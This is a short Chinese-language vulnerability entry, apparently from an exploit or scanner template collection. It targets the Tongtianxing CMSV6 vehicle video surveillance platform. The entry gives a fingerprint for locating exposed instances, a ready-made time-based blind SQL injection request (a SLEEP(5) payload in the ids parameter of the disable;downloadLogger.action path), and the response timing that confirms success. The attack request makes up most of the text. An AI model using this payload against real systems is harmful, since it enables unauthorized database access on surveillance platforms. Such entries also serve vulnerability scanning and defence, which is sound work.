# 通天星CMSV6车载视频监控平台disable存在SQL注入漏洞

通天星CMSV6车载视频监控平台 ｜ SQL注入 ｜ —
- **指纹**：`body="./open/webApi.html"`
- **请求**：`GET /edu_security_officer/disable;downloadLogger.action?ids=1+AND+%28SELECT+2688+FROM+%28SELECT%28SLEEP%285%29%29%29kOIi%29 HTTP/1.1`
- **响应特征**：200 响应时间>=5s